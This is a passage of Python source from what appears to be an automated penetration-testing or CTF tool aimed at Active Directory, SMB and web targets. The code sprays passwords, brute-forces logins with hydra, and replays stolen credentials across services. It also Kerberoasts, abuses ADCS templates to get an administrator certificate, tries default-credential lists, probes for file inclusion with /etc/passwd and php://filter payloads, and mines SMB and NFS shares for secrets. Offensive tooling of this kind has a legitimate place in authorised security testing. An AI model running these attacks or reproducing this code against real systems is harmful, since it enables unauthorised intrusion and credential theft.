    'mysql': 'mysql', 'postgresql': 'postgres', 'ms-sql-s': 'mssql',
    'microsoft-ds': 'smb', 'netbios-ssn': 'smb', 'rdp': 'rdp', 'ms-wbt-server': 'rdp',
    'vnc': 'vnc', 'imap': 'imap', 'pop3': 'pop3', 'ldap': 'ldap2',
    'rexec': 'rexec', 'rlogin': 'rlogin', 'redis': 'redis',
}


def _spray_userequal_pass(target, outdir, args, loot, context, nxc, domain=''):
    """username==password spray over ad_users.txt (the Soupedecode foothold).
    Active-gated; records hits as verified creds and seeds the reuse loop."""
    vulns = []
    users_file = outdir / 'ad_users.txt'
    if not (nxc and users_file.exists()):
        return vulns
    if not active_enabled(args):
        _recommend(loot, f"{Path(nxc).name} smb {target} -u {users_file} -p {users_file} "
                   f"--no-bruteforce --continue-on-success",
                   "spray username==password over enumerated users")
        return vulns
    info("spray: username==password over ad_users.txt")
    dom = ['-d', domain] if domain else []
    _, out, _ = _run([nxc, 'smb', target, '-u', str(users_file), '-p', str(users_file),
                     '--no-bruteforce', '--continue-on-success'] + dom, timeout=300)
    (outdir / 'spray_userpass.txt').write_text(out)
    for m in re.finditer(r'\[\+\]\s+\S+\\([^:\s]+):(\S+)', out):
        u, p = m.group(1), m.group(2)
        good(f"  SPRAY HIT: {u}:{p}")
        if loot:
            loot.add_cred(u, p, source='spray(user==pass)', scope='smb', verified=True)
            loot.add_step(f"Foothold: SMB cred {u}:{p} via username==password spray")
        if context is not None and not context.get('creds'):
            context['creds'] = f"{u}:{p}"
        vulns.append({'port': 445, 'service': 'smb', 'product': 'AD', 'version': '',
                     'desc': f'Weak credential (user==pass): {u}', 'cve': '',
                     'exploit': f'nxc smb {target} -u {u} -p {p}', 'severity': 'critical'})
    return vulns


def run_password_spray(target, services, outdir, args, tools, loot=None, context=None):
    """Horizontal password spray of discovered/enumerated AD users against a
    password wordlist (--passlist), via netexec SMB. Sprays one password across
    all users at a time (lockout-aware), stops on first hit, and feeds any valid
    credential into the reuse loop. Active-gated."""
    vulns = []
    if not active_enabled(args):
        return vulns
    nxc = _nxc_bin()
    passlist = getattr(args, 'passlist', None)
    users_file = outdir / 'ad_users.txt'
    if not (nxc and passlist and Path(passlist).exists() and users_file.exists()):
        return vulns
    users = [u for u in users_file.read_text().splitlines() if u.strip()]
    passwords = [p for p in Path(passlist).read_text().splitlines() if p.strip()]
    if not users or not passwords:
        return vulns
    domain = (context or {}).get('domain', '') or getattr(args, 'domain', '') or ''
    subsection(f"Password Spray ({len(users)} users x {len(passwords)} passwords)")
    dom = ['-d', domain] if domain else ['--local-auth']
    for pw in passwords:
        # one password across all users (horizontal spray)
        _, out, _ = _run([nxc, 'smb', target, '-u', str(users_file), '-p', pw,
                         '--continue-on-success'] + dom, timeout=120)
        for m in re.finditer(r'\\([^:\\\s]+):' + re.escape(pw) + r'\s+\[\+\]', out):
            pass
        for m in re.finditer(r'\[\+\]\s+\S+\\([^:\s]+):' + re.escape(re.sub(r'\s', '', pw)), out):
            u = m.group(1)
            good(f"  SPRAY HIT: {u}:{pw}")
            if loot:
                loot.add_cred(u, pw, source='password-spray', scope='smb', verified=True)
                loot.add_step(f"Foothold: {u}:{pw} via password spray")
            if context is not None and not context.get('creds'):
                context['creds'] = f"{u}:{pw}"
            vulns.append({'port': 445, 'service': 'smb', 'product': 'AD', 'version': '',
                         'desc': f'Valid credential via password spray: {u}:{pw}', 'cve': '',
                         'exploit': f'nxc smb {target} -u {u} -p {pw}', 'severity': 'critical'})
        # also catch generic [+] lines (nxc formats vary by version)
        if '[+]' in out and not vulns:
            for line in out.splitlines():
                if '[+]' in line and 'ghostlink' in line.lower():
                    m2 = re.search(r'\\([^:\s\\]+):(\S+)', line)
                    if m2:
                        good(f"  SPRAY HIT: {line.strip()}")
                        if loot:
                            loot.add_cred(m2.group(1), pw, source='password-spray', scope='smb', verified=True)
                        if context is not None and not context.get('creds'):
                            context['creds'] = f"{m2.group(1)}:{pw}"
                        vulns.append({'port': 445, 'service': 'smb', 'product': 'AD', 'version': '',
                                     'desc': f'Valid credential via password spray: {m2.group(1)}:{pw}',
                                     'cve': '', 'exploit': f'nxc smb {target} -u {m2.group(1)} -p {pw}',
                                     'severity': 'critical'})
        if vulns:
            break
    if not vulns:
        info("  no valid credentials from spray")
    return vulns


def run_credential_attacks(target, services, outdir, args, tools, loot=None, context=None):
    """hydra/medusa credential brute against discovered auth services. Active-gated.
    Consumes ad_users.txt when present; records validated creds into loot.valid_creds
    so the reuse sweep + credentialed AD collection can use them."""
    vulns = []
    if not (shutil.which('hydra') or shutil.which('medusa')):
        return vulns
    users_file = outdir / 'ad_users.txt'
    userlist = getattr(args, 'userlist', None) or (str(users_file) if users_file.exists()
               else _first_path(_DEFAULT_USERLISTS))
    passlist = getattr(args, 'passlist', None) or _first_path(_DEFAULT_PASSLISTS)

    targets = []
    for port, svc in services.items():
        name = svc.get('service', '').lower()
        mod = next((m for k, m in _HYDRA_SERVICES.items() if k in name), None)
        if mod:
            targets.append((port, mod, name))
    if not targets:
        return vulns

    if not active_enabled(args):
        for port, mod, name in targets:
            _recommend(loot,
                       f"hydra -L {userlist or '<users>'} -P {passlist or '<pass>'} "
                       f"-s {port} {target} {mod}",
                       f"brute {name} on {port}")
        return vulns

    if not (userlist and passlist):
        warn("credential attack: no user/pass wordlists found (use --userlist/--passlist)")
        return vulns

    subsection("Credential Attacks (active)")
    tasks = '4' if _low_intensity(args) else '16'
    for port, mod, name in targets:
        info(f"hydra {mod} on {target}:{port} (users={Path(userlist).name})")
        out_file = outdir / f'hydra_{mod}_{port}.txt'
        rc, out, _ = _run(['hydra', '-L', userlist, '-P', passlist, '-t', tasks,
                          '-f', '-o', str(out_file), '-s', str(port), target, mod],
                         timeout=900)
        body = (out_file.read_text() if out_file.exists() else '') + out
        for m in re.finditer(r'host:.*login:\s*(\S+)\s+password:\s*(\S+)', body):
            u, p = m.group(1), m.group(2)
            good(f"  VALID: {name}://{target}:{port}  {u}:{p}")
            if loot:
                loot.add_cred(u, p, source=f'hydra:{name}', scope=name, verified=True)
                loot.add_step(f"Foothold: {name} cred {u}:{p} via hydra")
            if context is not None and not context.get('creds'):
                context['creds'] = f"{u}:{p}"
            vulns.append({'port': port, 'service': name, 'product': mod, 'version': '',
                         'desc': f'Valid credentials found via hydra: {u}:{p}',
                         'cve': '', 'exploit': f'{name} login {u}:{p}',
                         'severity': 'critical'})
    return vulns


# ── Windows / AD / SMB deep enumeration ───────────────────────────────────
def _nxc_bin():
    return shutil.which('nxc') or shutil.which('netexec') or shutil.which('crackmapexec')


_REUSE_PROTOS = [  # nxc protocol -> service-name substrings / default ports implying it
    ('smb',   ('microsoft-ds', 'netbios-ssn', 'smb'), (445, 139)),
    ('ssh',   ('ssh',), (22,)),
    ('winrm', ('winrm', 'wsman'), (5985, 5986)),
    ('mssql', ('ms-sql',), (1433,)),
    ('ldap',  ('ldap',), (389, 636)),
    ('ftp',   ('ftp',), (21,)),
]


def run_credential_reuse(target, services, outdir, args, tools, loot=None, context=None):
    """The #1 recurring win in real engagements: take every discovered credential
    and try it against every other discovered auth service (read-only auth check via
    netexec). Widens each cred's scope and seeds context['creds'] for AD collection."""
    vulns = []
    if loot is None:
        return vulns
    creds = loot.get_unused_creds(verified_only=False)
    if not creds:
        return vulns
    # Only sweep once we're in active mode or creds were user-supplied
    if not (active_enabled(args) or getattr(args, 'creds', '')):
        return vulns
    nxc = _nxc_bin()
    svc_vals = [s.get('service', '').lower() for s in services.values()]
    protos = []
    for proto, subs, ports in _REUSE_PROTOS:
        if any(any(sub in v for sub in subs) for v in svc_vals) or any(p in services for p in ports):
            protos.append(proto)
    if not protos:
        return vulns
    if not nxc:
        _recommend(loot, f"nxc {'/'.join(protos)} {target} -u <user> -p <pass>   # each found cred",
                   "verify credential reuse across services")
        return vulns

    subsection("Credential Reuse Sweep")
    domain = context.get('domain', '') if context else ''
    for c in creds:
        user, pw = c.get('user'), c.get('pw')
        if not user or pw is None:
            continue
        loot.mark_used(c)
        worked = []
        for proto in protos:
            cmd = [nxc, proto, target, '-u', user, '-p', pw]
            if domain and proto in ('smb', 'ldap', 'winrm', 'mssql'):
                cmd += ['-d', domain]
            elif proto in ('smb', 'mssql'):
                cmd += ['--local-auth']
            _, out, _ = _run(cmd, timeout=60)
            if re.search(r'\[\+\]', out):
                worked.append(proto)
        if worked:
            good(f"  REUSE: {user}:{pw} valid on {', '.join(worked)}")
            c['scope'] = '+'.join(worked)
            c['verified'] = True
            if c not in loot.valid_creds:
                loot.valid_creds.append(c)
            if context is not None and not context.get('creds'):
                context['creds'] = f"{user}:{pw}"
            loot.add_step(f"Lateral: {user} reused on {', '.join(worked)}")
            vulns.append({'port': 445, 'service': 'auth', 'product': 'reuse', 'version': '',
                         'desc': f'Credential reuse: {user} works on {", ".join(worked)}',
                         'cve': '', 'exploit': f'nxc {worked[0]} {target} -u {user} -p {pw}',
                         'severity': 'high'})
    return vulns


def run_ad_enum_unauth(target, services, outdir, args, tools, loot=None, domain='', context=None):
    """Unauthenticated AD/SMB enumeration: null/guest shares + RID-brute (read-only,
    runs by default) and username==password spray (active-gated). Writes ad_users.txt
    consumed by the cred attacks/spray. Returns structured vulns (e.g. SMB signing)."""
    vulns = []
    context = context if context is not None else {}
    svc_names = {p: s.get('service', '').lower() for p, s in services.items()}
    has_smb = any(('microsoft-ds' in n or 'netbios-ssn' in n or 'smb' in n)
                  for n in svc_names.values()) or 445 in services or 139 in services
    has_ldap = any('ldap' in n for n in svc_names.values()) or 389 in services or 636 in services
    has_kerberos = any('kerberos' in n for n in svc_names.values()) or 88 in services
    nxc = _nxc_bin()
    if not (has_smb or has_ldap or has_kerberos):
        return vulns

    subsection("Windows / AD / SMB Enumeration (unauthenticated)")
    if nxc and has_smb:
        info(f"{Path(nxc).name} smb {target} (null session enum)")
        _, out, _ = _run([nxc, 'smb', target, '-u', '', '-p', '', '--shares'], timeout=120)
        (outdir / 'nxc_smb_null.txt').write_text(out)
        for line in out.splitlines():
            if 'READ' in line or 'WRITE' in line:
                good(f"  {line.strip()}")
                if loot:
                    loot.add('shares', line.strip())
        dom = re.search(r'\(domain:([^)]+)\)', out)
        if dom and not domain:
            domain = dom.group(1).strip()
        if domain:
            context['domain'] = domain
        if re.search(r'signing:\s*False', out, re.I):
            vulns.append({'port': 445, 'service': 'smb', 'product': 'SMB', 'version': '',
                         'desc': 'SMB signing not required (relay possible)', 'cve': '',
                         'exploit': 'ntlmrelayx.py -tf targets.txt -smb2support',
                         'severity': 'medium'})
        # RID-brute (read-only) -> ad_users.txt
        _, uout, _ = _run([nxc, 'smb', target, '-u', 'guest', '-p', '', '--rid-brute'], timeout=180)
        if 'SidTypeUser' not in uout:
            _, uout2, _ = _run([nxc, 'smb', target, '-u', '', '-p', '', '--rid-brute'], timeout=180)
            uout += uout2
        users = sorted(set(re.findall(r'\\([A-Za-z0-9._$-]+)\s+\(SidTypeUser\)', uout)))
        users = [u for u in users if not u.endswith('$')]
        if users:
            (outdir / 'ad_users.txt').write_text('\n'.join(users))
            good(f"  RID-brute users ({len(users)}): {', '.join(users[:15])}")
            context['users'] = users
            if loot:
                for u in users:
                    loot.add('usernames', u)
                loot.add('notes', f"AD users (RID-brute): {len(users)}")

        # Writable shares are a direct foothold (file drop / poisoning / cron pickup)
        for line in out.splitlines():
            m = re.match(r'\s*SMB\s+\S+\s+\d+\s+\S+\s+(\S+)\s+.*WRITE', line)
            if m and m.group(1).upper() not in ('IPC$',):
                sh = m.group(1)
                good(f"  WRITABLE share: {sh}")
                context.setdefault('writable_shares', [])
                if sh not in context['writable_shares']:
                    context['writable_shares'].append(sh)
                if loot:
                    loot.add('auth_findings', f"writable SMB share: {sh} (file-drop / hash-capture / cron vector)")
                    loot.add_step(f"SMB: writable share {sh} -> drop payload / SCF-lnk hash capture / cron pickup")
                vulns.append({'port': 445, 'service': 'smb', 'product': 'Samba', 'version': '',
                             'desc': f'Writable SMB share "{sh}" via null/guest session', 'cve': '',
                             'exploit': f"smbclient //{target}/{sh} -N -c 'put <file>'",
                             'severity': 'high'})

    # rpcclient SAMR enumeration — finds users on standalone Samba where RID-brute fails
    if has_smb and shutil.which('rpcclient'):
        info(f"rpcclient enumdomusers on {target} (null session)")
        _, ru, _ = _run(['rpcclient', '-N', '-U', '%', target,
                        '-c', 'enumdomusers;enumdomgroups;querydispinfo'], timeout=90)
        (outdir / 'rpcclient_enum.txt').write_text(ru)
        rusers = sorted(set(re.findall(r'user:\[([^\]]+)\]', ru)))
        if rusers:
            adf = outdir / 'ad_users.txt'
            existing = adf.read_text().splitlines() if adf.exists() else []
            adf.write_text('\n'.join(sorted(set(existing) | set(rusers))))
            context['users'] = sorted(set((context.get('users') or []) + rusers))
            good(f"  rpcclient users ({len(rusers)}): {', '.join(rusers[:20])}")
            if loot:
                for u in rusers:
                    loot.add('usernames', u)
                loot.add_step(f"SMB: enumerated {len(rusers)} users via rpcclient SAMR")

    if has_kerberos and domain and shutil.which('kerbrute'):
        users_file = outdir / 'ad_users.txt'
        ulist = str(users_file) if users_file.exists() else (
                getattr(args, 'userlist', None) or _first_path(_AD_USERLISTS)
                or _first_path(_DEFAULT_USERLISTS))
        if ulist and active_enabled(args):
            info(f"kerbrute userenum ({domain}, wl={Path(ulist).name})")
            _, out, _ = _run(['kerbrute', 'userenum', '-d', domain, '--dc', target,
                             '-o', str(outdir / 'kerbrute.txt'), ulist], timeout=600)
            kb = (outdir / 'kerbrute.txt').read_text() if (outdir / 'kerbrute.txt').exists() else ''
            valid = sorted(set(re.findall(r'VALID USERNAME:\s*([^@\s]+)', out + kb)))
            if valid:
                # persist so AS-REP roast / spray / reuse consume them
                existing = users_file.read_text().splitlines() if users_file.exists() else []
                users_file.write_text('\n'.join(sorted(set(existing + valid))))
                context['users'] = sorted(set((context.get('users') or []) + valid))
                for u in valid:
                    good(f"  valid user: {u}")
                    if loot:
                        loot.add('usernames', u)
                        loot.add_step(f"AD: valid user {u} (kerbrute) -> AS-REP roast / spray")
        elif ulist:
            _recommend(loot, f"kerbrute userenum -d {domain} --dc {target} {ulist}",
                       "validate AD usernames")

    vulns += _spray_userequal_pass(target, outdir, args, loot, context, nxc, domain)
    return vulns


def run_ad_collect_authed(target, services, outdir, args, tools, loot=None, domain='', context=None):
    """Credentialed AD collection (Kerberoast, BloodHound), fed by a validated cred
    from the reuse sweep / cred attacks (context['creds']) or explicit --creds."""
    vulns = []
    context = context if context is not None else {}
    domain = domain or context.get('domain', '')
    creds = getattr(args, 'creds', '') or context.get('creds', '')
    svc_names = {p: s.get('service', '').lower() for p, s in services.items()}
    has_ldap = any('ldap' in n for n in svc_names.values()) or 389 in services or 636 in services
    has_kerberos = any('kerberos' in n for n in svc_names.values()) or 88 in services
    has_winrm = 5985 in services or 5986 in services or any('winrm' in n for n in svc_names.values())
    has_mssql = any('ms-sql' in n for n in svc_names.values()) or 1433 in services
    nxc = _nxc_bin()

    if creds and domain:
        user, pw = (creds.split(':', 1) + [''])[:2]
        spn_bin = shutil.which('GetUserSPNs.py') or shutil.which('impacket-GetUserSPNs')
        if spn_bin:
            info(f"Kerberoast (GetUserSPNs) as {user}")
            _run([spn_bin, f'{domain}/{user}:{pw}', '-dc-ip', target, '-request',
                 '-outputfile', str(outdir / 'kerberoast.hash')], timeout=180)
            khash = outdir / 'kerberoast.hash'
            if khash.exists() and khash.stat().st_size:
                good("  Kerberoastable hashes captured -> kerberoast.hash")
                if loot:
                    loot.add('keys', 'Kerberoast TGS hashes (crack: hashcat -m 13100 kerberoast.hash)')
                    loot.add_step("AD: Kerberoast TGS captured -> hashcat -m 13100")
                vulns.append({'port': 88, 'service': 'kerberos', 'product': 'AD', 'version': '',
                             'desc': 'Kerberoastable service accounts (TGS hashes captured)',
                             'cve': '', 'exploit': 'hashcat -m 13100 kerberoast.hash wordlist',
                             'severity': 'high'})
        if shutil.which('bloodhound-python') and active_enabled(args):
            info(f"bloodhound-python collection as {user}")
            _run(['bloodhound-python', '-u', user, '-p', pw, '-d', domain,
                 '-ns', target, '-c', 'All', '--zip'], timeout=600)
            good("  BloodHound data collected (.zip)")
            if loot:
                loot.add('notes', 'BloodHound collection complete')
                loot.add_step("AD: BloodHound collected -> shortest path to Domain Admin")
        elif shutil.which('bloodhound-python'):
            _recommend(loot, f"bloodhound-python -u {user} -p '{pw}' -d {domain} -ns {target} -c All --zip",
                       "map AD attack paths")
        # AD CS: find vulnerable certificate templates (ESC1-ESC16) via certipy
        cbin = shutil.which('certipy') or shutil.which('certipy-ad')
        if cbin:
            info(f"certipy find (vulnerable ADCS templates) as {user}")
            _, cout, _ = _run([cbin, 'find', '-u', f'{user}@{domain}', '-p', pw,
                              '-dc-ip', target, '-vulnerable', '-stdout'], timeout=240)
            (outdir / 'certipy_find.txt').write_text(cout)
            escs = sorted(set(re.findall(r'ESC\d+', cout)))
            if escs:
                ca = (re.search(r'CA Name\s*:\s*(.+)', cout) or [None, ''])[1].strip()
                tmpl = (re.search(r'Template Name\s*:\s*(.+)', cout) or [None, ''])[1].strip()
                good(f"  ADCS VULNERABLE: {', '.join(escs)}  CA={ca} template={tmpl}")
                if loot:
                    loot.add('auth_findings', f"ADCS vulnerable: {', '.join(escs)} (CA {ca}, template {tmpl})")
                    loot.add_step(f"ADCS {escs[0]}: certipy req cert as administrator -> auth -> DA")
                vulns.append({'port': 636, 'service': 'adcs', 'product': 'AD CS', 'version': '',
                             'desc': f'AD CS vulnerable to {", ".join(escs)} (template {tmpl}, CA {ca})',
                             'cve': '',
                             'exploit': (f"{Path(cbin).name} req -u {user}@{domain} -p '{pw}' -ca '{ca}' "
                                         f"-template '{tmpl}' -upn administrator@{domain} -dc-ip {target}; "
                                         f"{Path(cbin).name} auth -pfx administrator.pfx -dc-ip {target}"),
                             'severity': 'critical'})
    elif has_ldap or has_kerberos:
        _recommend(loot, f"nxc ldap {target} -u <user> -p <pass> --bloodhound -c All",
                   "credentialed AD collection once you have a cred")
        if shutil.which('certipy') or shutil.which('certipy-ad'):
            _recommend(loot, f"certipy find -u <user>@{domain or '<domain>'} -p <pass> -dc-ip {target} "
                       f"-vulnerable -stdout", "enumerate AD CS for ESC1-ESC16 once you have a cred")

    if has_winrm:
        _recommend(loot, f"evil-winrm -i {target} -u <user> -p <pass>",
                   "interactive WinRM shell once you have creds")
    if has_mssql and nxc:
        _recommend(loot, f"{Path(nxc).name} mssql {target} -u <user> -p <pass> --local-auth",
                   "MSSQL access / xp_cmdshell")
    return vulns


# ── Web foothold heuristics (HTML-intel passive; default-cred/LFI/IDOR gated) ──
_LFI_PARAM_HINTS = ('file', 'page', 'path', 'include', 'inc', 'doc', 'document',
                    'template', 'tpl', 'lang', 'view', 'cat', 'dir', 'load', 'read',
                    'download', 'filename', 'name', 'conf', 'config')
_IDOR_PARAM_HINTS = ('id', 'uid', 'user', 'userid', 'account', 'acct', 'order', 'orderid',
                     'msg', 'no', 'num', 'number', 'doc', 'docid', 'pid', 'item', 'record',
                     'invoice', 'ticket', 'key')
# product signature (matched against whatweb output) -> (login path, [(user,pass)...])
_DEFAULT_CRED_PANELS = {
    'jenkins':    ('/', [('admin', 'admin')]),
    'tomcat':     ('/manager/html', [('tomcat', 'tomcat'), ('admin', 'admin'), ('tomcat', 's3cret'), ('admin', 'tomcat')]),
    'phpmyadmin': ('/index.php', [('root', ''), ('root', 'root'), ('root', 'toor')]),
    'grafana':    ('/login', [('admin', 'admin')]),
    'glassfish':  ('/', [('admin', 'admin')]),
    'wildfly':    ('/', [('admin', 'admin')]),
    'jboss':      ('/', [('admin', 'admin')]),
    'sonarqube':  ('/', [('admin', 'admin')]),
    'zabbix':     ('/', [('Admin', 'zabbix')]),
    'gitlab':     ('/', [('root', '5iveL!fe')]),
}


def _html_intel(url, port, outdir, loot):
    """Passive: harvest emails/usernames + tech/version banners from base page+headers."""
    if not shutil.which('curl') or loot is None:
        return
    _, body, _ = _run(['curl', '-sk', '-L', '--max-time', '10', url], timeout=15)
    _, hdrs, _ = _run(['curl', '-skIL', '--max-time', '10', url], timeout=15)
    blob = (body or '') + '\n' + (hdrs or '')
    if blob.strip():
        (outdir / f'html_intel_{port}.txt').write_text(blob[:40000])
    for e in sorted(set(re.findall(r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}', blob)))[:30]:
        loot.add('usernames', e)
        loot.add('usernames', e.split('@')[0])
    for m in re.finditer(r'(?i)(?:powered by|<meta name=["\']generator["\'] content=["\'])'
                         r'\s*([A-Za-z][\w .\-]{2,40})', blob):
        loot.add('notes', f"web tech: {m.group(1).strip()}")
    for name, val in re.findall(r'(?im)^(X-Powered-By|Server|X-Generator):\s*(.+)$', hdrs or ''):
        loot.add('notes', f"header {name}: {val.strip()[:80]}")


def run_web_foothold_suite(url, port, corpus, outdir, args, tools, loot=None):
    """HTML intelligence (passive), plus default-cred / LFI / IDOR heuristics
    (active-gated: probe when --active/--ctf, otherwise emit a ready-to-run command)."""
    vulns = []
    params = sorted(corpus.get('params', []))
    _html_intel(url, port, outdir, loot)

    # Default-cred probe on detected admin panels (product from whatweb output)
    ww = outdir / f'whatweb_{port}.txt'
    ww_text = ww.read_text().lower() if ww.exists() else ''
    for sig, (path, creds) in _DEFAULT_CRED_PANELS.items():
        if sig in ww_text or sig in url.lower():
            if not active_enabled(args):
                cred_str = ', '.join(f"{u}:{p or '<blank>'}" for u, p in creds)
                _recommend(loot, f"hydra/curl default-creds on {url}{path} ({cred_str})",
                           f"{sig} default credentials")
                continue
            for u, p in creds:
                code, _o, _e = _run(['curl', '-sk', '-o', '/dev/null', '-w', '%{http_code}',
                                    '-u', f'{u}:{p}', '--max-time', '8', url + path], timeout=10)
                if _o.strip() in ('200', '302') and shutil.which('curl'):
                    good(f"  default creds may work on {sig}: {u}:{p or '<blank>'}")
                    if loot:
                        loot.add_cred(u, p, source=f'default-cred:{sig}', scope='web', verified=False)
                        loot.add_step(f"Web: try default creds {u}:{p or '<blank>'} on {sig}")
                    vulns.append({'port': port, 'service': 'http', 'product': sig, 'version': '',
                                 'desc': f'{sig} reachable with default-credential candidate {u}:{p or "<blank>"}',
                                 'cve': '', 'exploit': f'login {url}{path} as {u}:{p}',
                                 'severity': 'high'})
            break

    # LFI + IDOR heuristics over parameterized URLs
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    lfi_seen, idor_seen = False, False
    for u in params:
        pu = urlparse(u)
        qs = parse_qsl(pu.query)
        names = [k.lower() for k, _ in qs]
        # IDOR: id-like param -> flag/recommend (safe: don't auto-abuse)
        if not idor_seen and any(any(h == n or n.endswith(h) for h in _IDOR_PARAM_HINTS) for n in names):
            idor_seen = True
            _recommend(loot, f"for i in $(seq 1 50); do curl -s '{u}' | ...; done   # {u}",
                       "IDOR: increment id-like parameter and diff responses")
        # LFI: file-like param -> gated probe
        if any(any(h in n for h in _LFI_PARAM_HINTS) for n in names):
            if not active_enabled(args):
                if not lfi_seen:
                    lfi_seen = True
                    _recommend(loot, f"ffuf/curl LFI: '{u}' with ../../../../etc/passwd & php://filter",
                               "LFI on file-like parameter")
                continue
            for payload in ('../../../../../../etc/passwd',
                            'php://filter/convert.base64-encode/resource=index'):
                test_qs = urlencode([(k, payload if k.lower() in
                                     [n for n in names if any(h in n for h in _LFI_PARAM_HINTS)]
                                     else v) for k, v in qs])
                test_url = urlunparse(pu._replace(query=test_qs))
                _, body, _ = _run(['curl', '-sk', '--max-time', '8', test_url], timeout=10)
                if re.search(r'root:.*:0:0:', body) or re.search(r'^[A-Za-z0-9+/]{80,}={0,2}$',
                                                                 body.strip()[:200] or '', re.M):
                    good(f"  LFI confirmed: {test_url}")
                    if loot:
                        loot.add('files', f'LFI: {test_url}')
                        loot.add_step(f"Web: LFI at {pu.path} -> read /etc/passwd, harvest users")
                    vulns.append({'port': port, 'service': 'http', 'product': 'web app', 'version': '',
                                 'desc': f'Local File Inclusion at {pu.path}', 'cve': '',
                                 'exploit': f'curl "{test_url}"', 'severity': 'high'})
                    break
    return vulns


# ── Pull & mine SMB shares / NFS mounts (safe read-only enum; NFS mount gated) ──
def run_share_mining(target, services, outdir, args, tools, loot=None):
    """Download readable SMB shares (and, gated, NFS exports), then scan_output the
    files for creds/keys/flags. Real loot lives inside shares, not in their listing."""
    vulns = []
    svc_names = {p: s.get('service', '').lower() for p, s in services.items()}
    has_smb = any(('microsoft-ds' in n or 'netbios-ssn' in n or 'smb' in n)
                  for n in svc_names.values()) or 445 in services or 139 in services
    has_nfs = any('nfs' in n or 'rpcbind' in n for n in svc_names.values()) or 2049 in services

    loot_dir = outdir / 'share_loot'
    # SMB: read-only by default; in --bb hold unless --active (avoid surprise data pull)
    smb_ok = has_smb and shutil.which('smbclient') and (not _low_intensity(args) or active_enabled(args))
    if has_smb and not smb_ok:
        _recommend(loot, f"smbmap -R -H {target} -u '' -p '' ; smbclient //{target}/<share> -N "
                   f"-c 'recurse ON; prompt OFF; mget *'", "pull & grep readable SMB shares")
    if smb_ok:
        subsection("SMB Share Pull & Mine")
        # discover readable non-admin shares from the null-session listing we already ran
        null_file = outdir / 'nxc_smb_null.txt'
        shares = set()
        if null_file.exists():
            for line in null_file.read_text().splitlines():
                if 'READ' in line:
                    m = re.search(r'\s(\S+)\s+READ', line)
                    if m:
                        shares.add(m.group(1))
        if not shares:
            _, out, _ = _run(['smbclient', '-N', '-L', f'//{target}/'], timeout=60)
            shares.update(re.findall(r'^\s*(\S+)\s+Disk', out, re.M))
        for sh in sorted(shares):
            if sh.upper() in ('ADMIN$', 'C$', 'IPC$', 'PRINT$'):
                continue
            dest = loot_dir / sh
            dest.mkdir(parents=True, exist_ok=True)
            info(f"pulling //{target}/{sh}")
            _run(['smbclient', f'//{target}/{sh}', '-N', '-c',
                 f'recurse ON; prompt OFF; lcd {dest}; mget *'], timeout=180)
            for f in dest.rglob('*'):
                if f.is_file() and f.stat().st_size < 5_000_000:
                    try:
                        text = f.read_text(errors='ignore')
                    except Exception:
                        continue
                    if loot:
                        loot.add('files', f'share://{sh}/{f.relative_to(dest)}')
                        loot.scan_output(text)
            if loot:
                loot.add_step(f"Loot: pulled SMB share {sh} -> mined for creds/keys")

    # NFS: mounting needs root + writes a mountpoint -> gate under --active
    if has_nfs and shutil.which('showmount'):
        _, out, _ = _run(['showmount', '-e', target], timeout=30)
        exports = re.findall(r'^(/\S+)', out, re.M)
        for exp in exports:
            if loot:
                loot.add('shares', f'NFS export: {exp}')
            if active_enabled(args) and shutil.which('mount') and os.geteuid() == 0:
                mp = loot_dir / ('nfs_' + exp.strip('/').replace('/', '_'))
                mp.mkdir(parents=True, exist_ok=True)
                rc, _o, _e = _run(['mount', '-t', 'nfs', '-o', 'nolock',
                                  f'{target}:{exp}', str(mp)], timeout=30)
                if rc == 0:
                    good(f"  mounted {exp}")
                    for f in mp.rglob('*'):
                        if f.is_file() and f.stat().st_size < 5_000_000:
                            try:
                                loot.scan_output(f.read_text(errors='ignore')) if loot else None
                            except Exception:
                                pass
                    _run(['umount', str(mp)], timeout=30)
                    if loot:
                        loot.add_step(f"Loot: mounted NFS {exp} -> mined for creds/keys")
            else:
                _recommend(loot, f"sudo mount -t nfs -o nolock {target}:{exp} /mnt/x && grep -r -Ei "
                           "'pass|id_rsa|\\.kdbx|flag' /mnt/x", "mount & mine NFS export")
    return vulns


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BROKEN AUTHENTICATION / SESSION / AUTH-LOGIC  (OWASP WSTG-ATHN + WSTG-SESS)
# ------------------------------------------------------------------------
# Tier 1 passive analysis runs by default; Tier 2 active probes are --active-
# gated (else _recommend); Tier 3 logic flaws are detect-surface + recommend.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_JWT_RE = re.compile(r'eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*')
_SESSION_COOKIE_HINTS = ('sess', 'sid', 'phpsessid', 'jsessionid', 'asp.net', 'auth',
                         'token', 'jwt', 'remember', 'login', 'csrf')
_ROLE_WORDS = ('role', 'admin', 'is_admin', 'isadmin', 'user', 'usertype', 'level',
               'priv', 'group', 'superuser', 'account', 'access')
_URL_SESSION_PARAMS = ('sessionid', 'session', 'sid', 'phpsessid', 'jsessionid',
                       'token', 'access_token', 'auth', 'sessid', 'jwt')


def _b64url_decode(seg):
    seg += '=' * (-len(seg) % 4)
    import base64
    return base64.urlsafe_b64decode(seg.encode()).decode('utf-8', 'ignore')


def _cookie_decodings(value):
    """Yield (encoding, decoded-text) for the encodings a cookie value might use:
    url, base64/base64url, and hex — so role/session data hidden by encoding surfaces."""
    import base64
    from urllib.parse import unquote
    out = [('url', unquote(value))]
    v = out[0][1]
    if re.fullmatch(r'[A-Za-z0-9+/_-]{8,}={0,2}', v):
        for label, dec in (('base64', lambda s: base64.b64decode(s + '=' * (-len(s) % 4))),
                           ('base64url', lambda s: base64.urlsafe_b64decode(s + '=' * (-len(s) % 4)))):
            try:
                t = dec(v).decode('utf-8', 'ignore')
                if t.isprintable() or t.strip().startswith(('{', '[')):
                    out.append((label, t))
            except Exception:
                pass
    if re.fullmatch(r'(?:[0-9a-fA-F]{2}){4,}', v):
        try:
            out.append(('hex', bytes.fromhex(v).decode('utf-8', 'ignore')))
        except Exception:
            pass
    return out


def _cookie_tamper_reason(name, value):
    """Heuristic: does this cookie look client-tamperable for privilege/session?
    Checks the raw value and its url/base64/hex decodings for role/session data."""
    v = value.strip('"')
    low = v.lower()
